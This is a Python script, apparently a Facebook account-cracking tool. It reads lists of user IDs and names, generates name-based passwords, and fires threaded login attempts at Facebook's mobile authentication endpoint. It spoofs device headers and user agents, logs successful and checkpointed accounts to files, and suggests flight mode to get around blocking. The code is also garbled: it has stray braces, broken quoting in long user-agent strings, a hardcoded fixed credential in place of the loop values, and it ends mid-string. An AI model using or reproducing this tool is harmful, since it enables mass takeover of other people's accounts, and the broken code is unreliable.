import os
import sys
import time
import uuid
import json
import string
import random
import requests
from requests.exceptions import ConnectionError
from concurrent.futures import ThreadPoolExecutor

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

loop = 0
idz = []
oks = []
cps = []
mtd = []
pwx = []

def logo():
    os.system("clear")
    print(banner)

def linex():
    print(f"-----------------------------------------------")

def menu():
    logo()
    print(" (1) File Clone ")
    print(" (2) Exit ")
    linex()
    x = input(" (+) Select : ")
    if x == "1":
        file()
    elif x == "2":
        exit("\n (!) Thanks For Using Tool ")
    else:
        exit("\n (!) Invalid Option ")

def file():
    try:
        linex()
        file_path = input(" (!) Enter File Path : ")
        lines = open(file_path, "r").read().splitlines()
        for x in lines:
            idz.append(x)
    except FileNotFoundError:
        exit("\n (!) File Not Found ")
    method()

def method():
    linex()
    print(" (1) Method 1 (For New Idz) ")
    print(" (2) Method 2 (For Old Idz) ")
    linex()
    m = input(" (+) Select Method : ")
    if m == "1":
        mtd.append("new")
        passw()
    elif m == "2":
        mtd.append("old")
        passw()
    else:
        exit("\n (!) Select Method Correctly ")

def passw():
    logo()
    print(" (!) Password Limit Should Be Less Than 10 ")
    linex()
    try:
        p_lim = int(input(" (+) Enter Password Limit : "))
    except ValueError:
        p_lim = 5
    linex()
    print(" (•) Example : first1122, firstlast etc ")
    linex()
    for x in range(p_lim):
        pwx.append(input(f" (+) Enter Password {x+1} : "))
    process()

def process():
    logo()
    total_id = str(len(idz))
    print(" (•) Total Accounts : "+total_id)
    print(" (!) If No Result Use Flight Mode ")
    linex()
    with ThreadPoolExecutor(max_workers=30) as asmat:
        for x in idz:
            uid, name = x.split("|")
            pword = pwx
            if "new" in mtd:
                asmat.submit(m1, uid, name, pword, total_id)
            elif "old" in mtd:
                asmat.submit(m2, uid, name, pword, total_id)
            else:
                asmat.submit(m1, uid, name, pword, total_id)
    linex()
    print(" (!) Process Completed ")
    print(" (•) Total Ok Accounts : "+str(len(oks)))
    print(" (•) Total Cp Accounts : "+str(len(cps)))
    linex()
    input(" (!) Press Enter To Exit ")
    exit()

def m1(uid, name, pword, total_id):
    global loop
    global oks
    global cps
    sys.stdout.write("\r %s(•) Running (%s/%s) (Ok-%s) (Cp-%s)\r"%(w, loop, total_id, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for pw in pword:
            ps = pw.replace("first", first).replace("last", last).lower()
            with requests.Session() as ses:
                ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36','[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.84;FBBV/852465906;FBDM/{density=1.5,width=1280,height=1280};FBLC/;FBRV/241956820;FBCR/SimSim;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-414XOP;FBSV/12.3.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91','Mozilla/5.0 (Linux; Android 6.0; SENSEIT R450) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36',Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.110 Safari/537.36','Mozilla/5.0 (Linux; Android 10; MRX-W29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36','Mozilla/5.0 (Linux; Android 10; MRX-W29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Safari/537.36','Dalvik/2.1.0 (Linux; U; Android 7.1.1; SM-G1650 Build/NMF26X)','Dalvik/2.1.0 (Linux; U; Android 9; Mi A1 MIUI/V10.0.24.0.PDHMIXM)','Mozilla/5.0 (Linux; Android 8.0.0; SO-03J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.2981.50 Safari/537.36','Mozilla/5.0 (Linux; Android 7.1.1; TA-1000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36','Dalvik/1.6.0 (Linux; U; Android 4.3; GT-I9158V Build/JLS36C)','Mozilla/5.0 (Windows; U; Windows NT 10.3;; en-US) AppleWebKit/535.23 (KHTML, like Gecko) Chrome/51.0.1626.255 Safari/603.2 Edge/15.77396','Mozilla/5.0 (Windows; U; Windows NT 10.4; x64; en-US) Gecko/20100101 Firefox/48.4','Mozilla/5.0 (Windows; U; Windows NT 10.2; x64; en-US) AppleWebKit/603.5 (KHTML, like Gecko) Chrome/55.0.3866.119 Safari/600','Mozilla/5.0 (Linux; U; Linux i564 ) AppleWebKit/536.27 (KHTML, like Gecko) Chrome/55.0.2619.212 Safari/537','Mozilla/5.0 (Windows NT 10.2;; en-US) AppleWebKit/603.26 (KHTML, like Gecko) Chrome/53.0.2165.291 Safari/536.2 Edge/18.40282','Mozilla/5.0 (Windows NT 6.2; WOW64; en-US) AppleWebKit/536.21 (KHTML, like Gecko) Chrome/55.0.3924.328 Safari/534.8 Edge/10.69463','Mozilla/5.0 (Linux; Linux i683 x86_64; en-US) AppleWebKit/601.1 (KHTML, like Gecko) Chrome/50.0.3010.139 Safari/534','Mozilla/5.0 (Linux; Android 7.1; Xperia V Build/NDE63X) AppleWebKit/535.42 (KHTML, like Gecko)  Chrome/47.0.3793.172 Mobile Safari/537.1','Mozilla/5.0 (Linux; Linux i552 ) AppleWebKit/533.14 (KHTML, like Gecko) Chrome/50.0.1853.120 Safari/603','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_3; like Mac OS X) AppleWebKit/602.17 (KHTML, like Gecko)  Chrome/49.0.3335.264 Mobile Safari/533.1"
                data = {'adid': '5595554a-52dd-4dc9-8317-ce1c5f5e22c0', 'format': 'json', 'device_id': 'de8ac8bf-3d84-44c7-a7ea-852c70fb4a71', 'cpl': 'true', 'family_device_id': '8682e310-a2a1-483f-9802-b6a4957a5c5f', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': '100089893217305', 'password': 'genoveva123', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '5228e4a2-f4dc-4545-aec8-a13b1214375f', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
                }
                headers = {
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Type": "MOBILE.LTE",
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                }
                url = "https://b-graph.facebook.com/auth/login"
                result = ses.post(url, data=data, headers=headers).json()
                if "session_key" in result:
                    print(f" {g}[Ok] {uid}|{ps} ")
                    open("/sdcard/Asmat-M1-Ok.txt", "a").write(f"{uid}|{ps}\n")
                    oks.append(uid)
                    break
                elif "www.facebook.com" in result["error"]["message"]:
                    print(f" {r}[Cp] {uid}|{ps} ")
                    open("/sdcard/Asmat-M1-Cp.txt", "a").write(f"{uid}|{ps}\n")
                    cps.append(uid)
                    break
                else:
                    continue
        loop+=1
    except ConnectionError:
        time.sleep(10)
    except:
        pass

def m2(uid, name, pword, total_id):
    global loop
    global oks
    global cps
    sys.stdout.write("\r %s(•) Running (%s/%s) (Ok-%s) (Cp-%s)\r"%(w, loop, total_id, len(oks), len(cps))),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for pw in pword:
            ps = pw.replace("first", first).replace("last", last).lower()
            with requests.Session() as ses:
                ua = "[FBAN/FB4A;FBAV/23.0.0.2653;[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.76;FBBV/362416194;FBDM/{density=1.5,width=1080,height=1440};FBLC/en_CA;FBRV/0;FBCR/Metro by T-Mobile;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1805;FBSV/11.1.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]','Mozilla/5.0 (Linux; Android 12; SM-A035M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]','Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; SM-A025M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; SM-A600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; 5164D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]','Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBDV/iPhone14,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]','Mozilla/5.0 (Linux; Android 9; SM-A202F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]','Mozilla/5.0 (Linux; Android 10; HTC Desire 20+ Build/QKQ1.200706.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 12; AMICO SMARTPHONE POCKET Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.25.214;]','Mozilla/5.0 (Linux; Android 9; TA-1021 Build/PKQ1.181105.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/392.0.0.12.106;]','Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]','Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; M2006C3LI Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 13; SM-G781B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.1.0.46.101;]','Mozilla/5.0 (Linux; Android 10; VOG-L09 Build/HUAWEIVOG-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (iPad; CPU OS 15_7_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H365 [FBAN/FBIOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iPadOS;FBSV/15.7.9;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 12; M2101K6I Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 7.0; SM-A710M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.23.116;]','Mozilla/5.0 (Linux; Android 12; SM-N9700 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 12; SM-A042M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/290.0.0.44.121;]','Mozilla/5.0 (iPad; CPU OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBDV/iPad14,5;FBMD/iPad;FBSN/iPadOS;FBSV/16.6.1;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 11; 5164D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/364.0.0.14.77;]','Mozilla/5.0 (Linux; Android 10; CPH2185 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]','Mozilla/5.0 (Linux; Android 9; SM-J415FN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]','Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A360 [FBAN/FBIOS;FBAV/436.1.0.49.100;FBBV/525940286;FBDV/iPhone14,7;FBMD/iPhone;FBSN/iOS;FBSV/17.0.3;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/527921655]','Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 9; SM-A920F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]','Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H365 [FBAN/FBIOS;FBDV/iPhone9,4;FBMD/iPhone;FBSN/iOS;FBSV/15.7.9;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 12; SM-T860 Build/SP2A.220305.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; BLA-L09 Build/HUAWEIBLA-L09S; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;]','Mozilla/5.0 (Linux; Android 12; 2201117TG Build/SKQ1.211103.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 7.0; LG-M200 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 13; M2101K7BL Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]"
                data = {'adid': '5595554a-52dd-4dc9-8317-ce1c5f5e22c0', 'format': 'json', 'device_id': 'de8ac8bf-3d84-44c7-a7ea-852c70fb4a71', 'cpl': 'true', 'family_device_id': '8682e310-a2a1-483f-9802-b6a4957a5c5f', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': '100089893217305', 'password': 'genoveva123', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '5228e4a2-f4dc-4545-aec8-a13b1214375f', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
                }
                headers = {
                    "User-Agent": ua,
                    'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'User-Agent': "[FBAN/FB4A;FBAV/23.0.0.2653;[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/196.0.0.76;FBBV/362416194;FBDM/{density=1.5,width=1080,height=1440};FBLC/en_CA;FBRV/0;FBCR/Metro by T-Mobile;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1805;FBSV/11.1.5;FBOP/1;FBCA/armeabi-v7a:armeabi;]','Mozilla/5.0 (Linux; Android 12; SM-A035M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/376.0.0.7.103;]','Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; SM-A025M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; SM-A600FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; 5164D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]','Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBDV/iPhone14,8;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]','Mozilla/5.0 (Linux; Android 9; SM-A202F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]','Mozilla/5.0 (Linux; Android 10; HTC Desire 20+ Build/QKQ1.200706.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 12; AMICO SMARTPHONE POCKET Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.25.214;]','Mozilla/5.0 (Linux; Android 9; TA-1021 Build/PKQ1.181105.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/392.0.0.12.106;]','Mozilla/5.0 (Linux; Android 12; SM-N980F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.42.112;]','Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro Build/SKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; M2006C3LI Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 13; SM-G781B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.1.0.46.101;]','Mozilla/5.0 (Linux; Android 10; VOG-L09 Build/HUAWEIVOG-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (iPad; CPU OS 15_7_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19H365 [FBAN/FBIOS;FBDV/iPad5,1;FBMD/iPad;FBSN/iPadOS;FBSV/15.7.9;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 12; M2101K6I Build/SKQ1.210908.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 7.0; SM-A710M Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 12; M2012K11G Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/437.0.0.23.116;]','Mozilla/5.0 (Linux; Android 12; SM-N9700 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBDV/iPhone14,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/en_GB;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 12; SM-A042M Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; SM-A307FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 11; SM-A105M Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/436.0.0.35.101;]','Mozilla/5.0 (Linux; Android 10; POT-LX1 Build/HUAWEIPOT-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/290.0.0.44.121;]','Mozilla/5.0 (iPad; CPU OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBDV/iPad14,5;FBMD/iPad;FBSN/iPadOS;FBSV/16.6.1;FBSS/2;FBID/tablet;FBLC/it_IT;FBOP/5];FBNV/1','Mozilla/5.0 (Linux; Android 11; 5164D Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) 